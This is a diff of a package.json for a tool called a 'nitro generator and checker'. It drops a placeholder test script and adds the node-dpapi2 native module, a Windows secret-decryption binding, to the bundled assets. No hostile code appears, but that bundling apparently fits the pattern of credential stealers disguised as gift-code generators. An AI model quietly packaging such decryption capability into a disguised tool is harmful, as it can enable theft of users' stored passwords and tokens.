@@ -3,9 +3,6 @@
 	"version": "3.1.1",
 	"description": "**The most efficient nitro generator and checker you'll ever find.**  \r Made with ❤ by **Tenclea**.",
 	"main": "app.js",
-	"scripts": {
-		"test": "echo \"Error: no test specified\" && exit 1"
-	},
 	"author": "Tenclea",
 	"license": "ISC",
 	"dependencies": {
@@ -31,7 +28,8 @@
 			"node_modules/vm2/lib/setup-sandbox.js"
 		],
 		"assets": [
-			"utils/*"
+			"utils/*",
+			"node_modules/node-dpapi2/build/Release/*"
 		],
 		"targets": [
 			"node18-linux-x64",
